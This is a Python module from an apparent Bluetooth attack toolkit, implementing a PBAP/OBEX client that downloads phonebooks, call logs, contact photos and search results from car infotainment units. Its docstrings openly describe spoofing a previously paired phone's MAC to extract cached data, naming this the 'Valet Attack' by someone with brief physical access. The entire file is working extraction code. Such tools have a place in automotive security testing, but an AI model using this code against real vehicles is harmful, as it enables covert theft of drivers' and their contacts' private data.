"""PBAP (Phone Book Access Profile) client for phonebook/call log extraction.

PBAP uses OBEX over RFCOMM or L2CAP to download vCard data from a device.
IVIs that pair with phones typically cache the phonebook locally, so connecting
as the spoofed phone can pull the cached data.

Target UUID: 0x112f (PBAP PSE - Phone Book Server Equipment)
OBEX Target Header: 796135f0-f0c5-11d8-0966-0800200c9a66 (PBAP)
"""

import os
import socket
import struct

from blue_tap.utils.bt_helpers import PBAP_REPOS
from blue_tap.utils.output import info, success, error, warning


# PBAP OBEX Target UUID
PBAP_TARGET_UUID = bytes.fromhex("796135f0f0c511d809660800200c9a66")

# OBEX opcodes
OBEX_CONNECT = 0x80
OBEX_DISCONNECT = 0x81
OBEX_GET = 0x83
OBEX_SETPATH = 0x85
OBEX_RESPONSE_SUCCESS = 0xA0
OBEX_RESPONSE_CONTINUE = 0x90

# OBEX headers
OBEX_HEADER_NAME = 0x01           # Unicode string
OBEX_HEADER_TYPE = 0x42           # Byte sequence
OBEX_HEADER_BODY = 0x48           # Byte sequence
OBEX_HEADER_END_OF_BODY = 0x49    # Byte sequence
OBEX_HEADER_TARGET = 0x46         # Byte sequence
OBEX_HEADER_WHO = 0x4A            # Byte sequence
OBEX_HEADER_CONNECTION_ID = 0xCB  # 4-byte value
OBEX_HEADER_APP_PARAMS = 0x4C    # Byte sequence


class PBAPClient:
    """PBAP client for downloading phonebook and call logs from IVI/phone.

    Usage:
        client = PBAPClient("AA:BB:CC:DD:EE:FF", channel=15)
        client.connect()
        phonebook = client.pull_phonebook("telecom/pb.vcf")
        call_log = client.pull_phonebook("telecom/ich.vcf")
        client.disconnect()
    """

    def __init__(self, address: str, channel: int | None = None, port: int | None = None):
        """Initialize PBAP client.

        Args:
            address: Target Bluetooth MAC address
            channel: RFCOMM channel for PBAP (from SDP discovery)
            port: Alternative L2CAP PSM
        """
        self.address = address
        self.channel = channel
        self.port = port
        self.sock = None
        self.connection_id = None
        self.max_packet = 0xFFFF

    def connect(self) -> bool:
        """Establish OBEX connection to PBAP server."""
        try:
            # Connect RFCOMM socket
            self.sock = socket.socket(
                socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM
            )
            self.sock.settimeout(15.0)
            info(f"Connecting RFCOMM to {self.address} channel {self.channel}...")
            self.sock.connect((self.address, self.channel))
            success("RFCOMM connected")

            # Send OBEX Connect with PBAP target
            connect_packet = self._build_connect()
            self.sock.send(connect_packet)

            response = self._recv_response()
            if response is None:
                error("No OBEX response received")
                return False

            opcode = response[0]
            if opcode != OBEX_RESPONSE_SUCCESS:
                error(f"OBEX Connect rejected: 0x{opcode:02x}")
                return False

            # Parse connection ID from response
            self._parse_connect_response(response)
            success(f"PBAP OBEX session established (conn_id={self.connection_id})")
            return True

        except OSError as e:
            error(f"PBAP connect failed: {e}")
            return False

    def disconnect(self):
        """Disconnect OBEX session."""
        if self.sock:
            try:
                disconnect_pkt = struct.pack(">BH", OBEX_DISCONNECT, 3)
                if self.connection_id is not None:
                    disconnect_pkt = struct.pack(">BH", OBEX_DISCONNECT, 8)
                    disconnect_pkt += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID,
                                                  self.connection_id)
                self.sock.send(disconnect_pkt)
                self._recv_response()
            except OSError:
                pass
            finally:
                self.sock.close()
                self.sock = None
            info("PBAP disconnected")

    def pull_phonebook(self, path: str = "telecom/pb.vcf",
                       max_count: int = 0, offset: int = 0) -> str:
        """Pull a phonebook object (vCard listing).

        Args:
            path: PBAP virtual path (see PBAP_REPOS for options)
            max_count: Max entries to retrieve (0 = all)
            offset: Starting offset

        Returns:
            vCard data as string
        """
        desc = PBAP_REPOS.get(path, path)
        info(f"Pulling: {desc} ({path})")

        # Build GET request with PBAP headers
        headers = b""

        # Connection ID
        if self.connection_id is not None:
            headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID, self.connection_id)

        # Name header (Unicode, null-terminated)
        name_bytes = path.encode("utf-16-be") + b"\x00\x00"
        headers += struct.pack(">BH", OBEX_HEADER_NAME, len(name_bytes) + 3) + name_bytes

        # Type header
        type_str = b"x-bt/phonebook\x00"
        headers += struct.pack(">BH", OBEX_HEADER_TYPE, len(type_str) + 3) + type_str

        # Application parameters
        app_params = self._build_pbap_app_params(max_count, offset)
        if app_params:
            headers += struct.pack(">BH", OBEX_HEADER_APP_PARAMS,
                                   len(app_params) + 3) + app_params

        # Send GET request
        total_len = 3 + len(headers)
        packet = struct.pack(">BH", OBEX_GET, total_len) + headers
        self.sock.send(packet)

        # Receive multi-part response
        body = b""
        while True:
            response = self._recv_response()
            if response is None:
                break

            opcode = response[0]
            body_data = self._extract_body(response)
            if body_data:
                body += body_data

            if opcode == OBEX_RESPONSE_SUCCESS:
                break
            elif opcode == OBEX_RESPONSE_CONTINUE:
                # Send another GET to continue
                cont_headers = b""
                if self.connection_id is not None:
                    cont_headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID,
                                                self.connection_id)
                cont_len = 3 + len(cont_headers)
                cont_pkt = struct.pack(">BH", OBEX_GET, cont_len) + cont_headers
                self.sock.send(cont_pkt)
            else:
                error(f"PBAP GET error: 0x{opcode:02x}")
                break

        result = body.decode("utf-8", errors="replace")
        if result:
            success(f"Downloaded {len(result)} bytes from {path}")
        else:
            warning(f"No data received from {path}")
        return result

    def pull_vcard_listing(self, path: str = "telecom/pb") -> str:
        """Pull vCard listing (directory of entries).

        This returns an XML listing of available vCards rather than the full data.
        """
        info(f"Listing vCards in {path}")

        headers = b""
        if self.connection_id is not None:
            headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID, self.connection_id)

        name_bytes = path.encode("utf-16-be") + b"\x00\x00"
        headers += struct.pack(">BH", OBEX_HEADER_NAME, len(name_bytes) + 3) + name_bytes

        type_str = b"x-bt/vcard-listing\x00"
        headers += struct.pack(">BH", OBEX_HEADER_TYPE, len(type_str) + 3) + type_str

        total_len = 3 + len(headers)
        packet = struct.pack(">BH", OBEX_GET, total_len) + headers
        self.sock.send(packet)

        body = b""
        while True:
            response = self._recv_response()
            if response is None:
                break
            opcode = response[0]
            body_data = self._extract_body(response)
            if body_data:
                body += body_data
            if opcode == OBEX_RESPONSE_SUCCESS:
                break
            elif opcode == OBEX_RESPONSE_CONTINUE:
                cont_headers = b""
                if self.connection_id is not None:
                    cont_headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID,
                                                self.connection_id)
                cont_pkt = struct.pack(">BH", OBEX_GET, 3 + len(cont_headers)) + cont_headers
                self.sock.send(cont_pkt)
            else:
                break

        return body.decode("utf-8", errors="replace")

    def pull_all_data(self, output_dir: str = "pbap_dump") -> dict:
        """Pull all available PBAP data: phonebook, call logs, etc."""
        os.makedirs(output_dir, exist_ok=True)
        results = {}

        for path, description in PBAP_REPOS.items():
            info(f"Trying: {description}")
            try:
                data = self.pull_phonebook(path)
                if data and len(data) > 10:  # More than empty vCard
                    filename = path.replace("/", "_")
                    filepath = os.path.join(output_dir, filename)
                    with open(filepath, "w") as f:
                        f.write(data)
                    results[path] = {"description": description, "file": filepath,
                                     "size": len(data)}
                    success(f"Saved: {filepath} ({len(data)} bytes)")
            except Exception as e:
                warning(f"Failed to pull {path}: {e}")

        return results

    def _build_connect(self) -> bytes:
        """Build OBEX Connect packet with PBAP target."""
        # Target header
        target_header = struct.pack(">BH", OBEX_HEADER_TARGET,
                                    len(PBAP_TARGET_UUID) + 3) + PBAP_TARGET_UUID

        # OBEX Connect: opcode(1) + length(2) + version(1) + flags(1) + max_packet(2) + headers
        body = struct.pack(">BBH", 0x10, 0x00, self.max_packet) + target_header
        total_len = 3 + len(body)
        return struct.pack(">BH", OBEX_CONNECT, total_len) + body

    def _recv_response(self) -> bytes | None:
        """Receive an OBEX response packet."""
        try:
            self.sock.settimeout(10.0)
            header = self.sock.recv(3)
            if len(header) < 3:
                return None
            opcode = header[0]
            length = struct.unpack(">H", header[1:3])[0]
            remaining = length - 3
            data = b""
            while remaining > 0:
                chunk = self.sock.recv(min(remaining, 4096))
                if not chunk:
                    break
                data += chunk
                remaining -= len(chunk)
            return bytes([opcode]) + header[1:3] + data
        except (TimeoutError, OSError):
            return None

    def _parse_connect_response(self, response: bytes):
        """Parse OBEX Connect response for connection ID."""
        # Skip opcode(1) + length(2) + version(1) + flags(1) + max_packet(2)
        offset = 7
        while offset < len(response):
            header_id = response[offset]
            if header_id == OBEX_HEADER_CONNECTION_ID:
                self.connection_id = struct.unpack(">I", response[offset + 1:offset + 5])[0]
                offset += 5
            elif header_id & 0xC0 == 0x00:  # Unicode string
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif header_id & 0xC0 == 0x40:  # Byte sequence
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif header_id & 0xC0 == 0x80:  # 1-byte value
                offset += 2
            elif header_id & 0xC0 == 0xC0:  # 4-byte value
                offset += 5
            else:
                break

    def _extract_body(self, response: bytes) -> bytes:
        """Extract Body or End-of-Body data from OBEX response."""
        data = b""
        offset = 3  # Skip opcode + length
        while offset < len(response):
            header_id = response[offset]
            if header_id in (OBEX_HEADER_BODY, OBEX_HEADER_END_OF_BODY):
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                data += response[offset + 3:offset + length]
                offset += length
            elif header_id & 0xC0 == 0x00:
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif header_id & 0xC0 == 0x40:
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif header_id & 0xC0 == 0x80:
                offset += 2
            elif header_id & 0xC0 == 0xC0:
                offset += 5
            else:
                break
        return data

    def get_phonebook_size(self, path: str = "telecom/pb.vcf") -> int:
        """Query phonebook size without downloading data.

        Returns the number of entries, or -1 on failure.
        """
        info(f"Querying phonebook size for {path}...")
        headers = b""
        if self.connection_id is not None:
            headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID, self.connection_id)

        name_bytes = path.encode("utf-16-be") + b"\x00\x00"
        headers += struct.pack(">BH", OBEX_HEADER_NAME, len(name_bytes) + 3) + name_bytes

        type_str = b"x-bt/phonebook\x00"
        headers += struct.pack(">BH", OBEX_HEADER_TYPE, len(type_str) + 3) + type_str

        # MaxListCount=0 returns only the size, not the data
        app_params = struct.pack(">BBH", 0x04, 0x02, 0)
        headers += struct.pack(">BH", OBEX_HEADER_APP_PARAMS,
                               len(app_params) + 3) + app_params

        packet = struct.pack(">BH", OBEX_GET, 3 + len(headers)) + headers
        self.sock.send(packet)

        response = self._recv_response()
        if response and response[0] == OBEX_RESPONSE_SUCCESS:
            # Parse PhonebookSize from application parameters in response
            size = self._parse_phonebook_size(response)
            if size >= 0:
                info(f"Phonebook {path} contains {size} entries")
            return size
        return -1

    def _parse_phonebook_size(self, response: bytes) -> int:
        """Extract PhonebookSize (tag 0x08) from OBEX app params."""
        offset = 3
        while offset < len(response):
            hid = response[offset]
            if hid == OBEX_HEADER_APP_PARAMS:
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                params = response[offset + 3:offset + length]
                # Parse TLV params
                p = 0
                while p < len(params) - 1:
                    tag = params[p]
                    tag_len = params[p + 1]
                    if tag == 0x08 and tag_len == 2 and p + 4 <= len(params):
                        return struct.unpack(">H", params[p + 2:p + 4])[0]
                    p += 2 + tag_len
                offset += length
            elif hid & 0xC0 in (0x00, 0x40):
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif hid & 0xC0 == 0x80:
                offset += 2
            elif hid & 0xC0 == 0xC0:
                offset += 5
            else:
                break
        return -1

    def search_phonebook(self, search_value: str,
                          search_by: str = "name",
                          path: str = "telecom/pb") -> str:
        """Search phonebook by name or number.

        Args:
            search_value: String to search for
            search_by: "name" (0x00), "number" (0x01), or "sound" (0x02)
            path: PBAP folder to search in

        Returns:
            XML vCard listing of matching entries
        """
        search_attr = {"name": 0x00, "number": 0x01, "sound": 0x02}.get(search_by, 0x00)
        info(f"Searching phonebook by {search_by}: '{search_value}'")

        headers = b""
        if self.connection_id is not None:
            headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID, self.connection_id)

        name_bytes = path.encode("utf-16-be") + b"\x00\x00"
        headers += struct.pack(">BH", OBEX_HEADER_NAME, len(name_bytes) + 3) + name_bytes

        type_str = b"x-bt/vcard-listing\x00"
        headers += struct.pack(">BH", OBEX_HEADER_TYPE, len(type_str) + 3) + type_str

        # App params: SearchAttribute + SearchValue
        search_bytes = search_value.encode("utf-8") + b"\x00"
        app_params = struct.pack(">BBB", 0x02, 0x01, search_attr)  # SearchAttribute
        app_params += struct.pack(">BB", 0x03, len(search_bytes)) + search_bytes  # SearchValue

        headers += struct.pack(">BH", OBEX_HEADER_APP_PARAMS,
                               len(app_params) + 3) + app_params

        packet = struct.pack(">BH", OBEX_GET, 3 + len(headers)) + headers
        self.sock.send(packet)

        body = b""
        while True:
            response = self._recv_response()
            if response is None:
                break
            opcode = response[0]
            body_data = self._extract_body(response)
            if body_data:
                body += body_data
            if opcode == OBEX_RESPONSE_SUCCESS:
                break
            elif opcode == OBEX_RESPONSE_CONTINUE:
                cont_headers = b""
                if self.connection_id is not None:
                    cont_headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID,
                                                self.connection_id)
                self.sock.send(struct.pack(">BH", OBEX_GET, 3 + len(cont_headers)) + cont_headers)
            else:
                break

        result = body.decode("utf-8", errors="replace")
        if result:
            success(f"Search returned results ({len(result)} bytes)")
        else:
            warning("No matching entries found")
        return result

    def pull_with_photo(self, path: str = "telecom/pb.vcf",
                         output_dir: str = "pbap_photos") -> dict:
        """Pull phonebook with embedded photos extracted to files.

        Downloads vCards with PHOTO property (filter bit 3) enabled,
        then extracts base64-encoded JPEG/PNG images to separate files.

        Returns:
            Dict mapping contact name to photo file path
        """
        import base64
        import re

        info("Pulling phonebook with photos...")
        data = self.pull_phonebook(path)
        if not data:
            return {}

        os.makedirs(output_dir, exist_ok=True)
        photos = {}

        # Parse vCards for PHOTO property
        current_name = ""
        in_photo = False
        photo_data = []

        for line in data.splitlines():
            if line.startswith("FN:") or line.startswith("FN;"):
                current_name = line.split(":", 1)[1].strip()
            elif line.startswith("PHOTO;"):
                in_photo = True
                photo_data = []
                # Some formats put data on same line after base64:
                if ":" in line:
                    b64_part = line.split(":", 1)[1].strip()
                    if b64_part:
                        photo_data.append(b64_part)
            elif in_photo:
                if line.startswith(" ") or line.startswith("\t"):
                    photo_data.append(line.strip())
                else:
                    # End of photo data
                    if photo_data and current_name:
                        try:
                            raw = base64.b64decode("".join(photo_data))
                            ext = "jpg" if raw[:2] == b"\xff\xd8" else "png"
                            safe_name = re.sub(r'[^\w\-]', '_', current_name)[:50]
                            photo_file = os.path.join(output_dir, f"{safe_name}.{ext}")
                            with open(photo_file, "wb") as f:
                                f.write(raw)
                            photos[current_name] = photo_file
                            success(f"  Photo: {current_name} -> {photo_file}")
                        except Exception:
                            pass
                    in_photo = False
                    photo_data = []

        info(f"Extracted {len(photos)} contact photo(s)")
        return photos

    def pull_stale_data(self, output_dir: str = "pbap_stale") -> dict:
        """Attempt to pull phonebook data that may be cached from previous pairings.

        IVIs often cache phonebook data in cleartext even after the phone disconnects.
        By spoofing a previously-paired phone's MAC and connecting to the IVI,
        we can access the cached data without re-pairing.

        This is the "Valet Attack" — a parking valet or mechanic with temporary
        physical access can extract all contacts and call history.
        """
        info("Attempting stale data extraction (cached from previous pairing)...")
        info("This works when spoofing a previously-paired phone's MAC")

        results = self.pull_all_data(output_dir)
        if results:
            success(f"Extracted {len(results)} cached phonebook objects")
            info("This data may include contacts from a previously-paired phone")
        else:
            warning("No cached phonebook data found — IVI may have cleared cache")
        return results

    def _build_pbap_app_params(self, max_count: int = 0, offset: int = 0,
                                vcard_version: int = 1,
                                filter_bits: int | None = None) -> bytes:
        """Build PBAP Application Parameters header.

        Tag IDs per PBAP spec:
          0x04 = MaxListCount (2 bytes)
          0x05 = ListStartOffset (2 bytes)
          0x06 = Filter (8 bytes) - which vCard fields to include
          0x07 = Format (1 byte) - 0=vCard2.1, 1=vCard3.0

        Filter bits (64-bit bitmask):
          bit 0: VERSION       bit 1: FN          bit 2: N
          bit 3: PHOTO         bit 4: BDAY        bit 5: ADR
          bit 6: LABEL         bit 7: TEL         bit 8: EMAIL
          bit 9: MAILER        bit 10: TZ         bit 11: GEO
          bit 12: TITLE        bit 13: ROLE       bit 14: LOGO
          bit 15: AGENT        bit 16: ORG        bit 17: NOTE
          bit 18: REV          bit 19: SOUND      bit 20: URL
          bit 21: UID          bit 22: KEY        bit 23: NICKNAME
          bit 24: CATEGORIES   bit 25: PROID      bit 26: CLASS
          bit 27: SORT-STRING  bit 28: X-IRMC-CALL-DATETIME
        """
        params = b""

        # Format: 0=vCard 2.1, 1=vCard 3.0
        params += struct.pack(">BBB", 0x07, 0x01, vcard_version)

        if max_count > 0:
            params += struct.pack(">BBH", 0x04, 0x02, max_count)

        if offset > 0:
            params += struct.pack(">BBH", 0x05, 0x02, offset)

        # Filter: specific bits or all fields
        if filter_bits is not None:
            params += struct.pack(">BB", 0x06, 0x08) + struct.pack(">Q", filter_bits)
        else:
            # All fields
            params += struct.pack(">BB", 0x06, 0x08) + b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"

        return params
